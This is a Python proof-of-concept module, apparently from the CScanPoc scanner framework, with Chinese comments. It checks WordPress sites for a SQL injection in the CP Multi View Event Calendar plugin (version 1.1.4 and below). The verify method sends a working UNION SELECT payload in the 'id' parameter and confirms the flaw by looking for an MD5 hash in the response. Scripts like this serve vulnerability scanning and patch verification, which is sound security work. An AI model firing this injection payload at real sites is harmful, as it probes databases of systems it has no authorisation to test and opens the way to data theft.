# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib
import urllib2

class Vuln(ABVuln):
    vuln_id = 'WordPress_0006'  # 平台漏洞编号，留空
    name = 'WordPress CP Multi View Event Calendar 注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-05-01'  # 漏洞公布时间
    desc = '''
        CP Multi View Event Calendar is a plugin allow you insert event calender into your wp website.
        版本在1.1.4及其以下存在sql注入。
    '''  # 漏洞描述
    ref = 'https://packetstormsecurity.com/files/128814/WordPress-CP-Multi-View-Event-Calendar-1.01-SQL-Injection.html'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'Wordpress'  # 漏洞应用名称
    product_version = 'CP Multi View Event Calendar <= 1.1.4'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '25dab31d-bfe9-42ae-91ba-fbd1e6f82a8c'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-04'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = ('/?action=data_management&cpmvc_do_action=mvparse&f=edit&id=1 union all select MD5(233)'
                        ',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#')
            verify_url = self.target + payload

            content = requests.get(verify_url).content
            if 'e165421110ba03099a1c0393373c5b43' in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
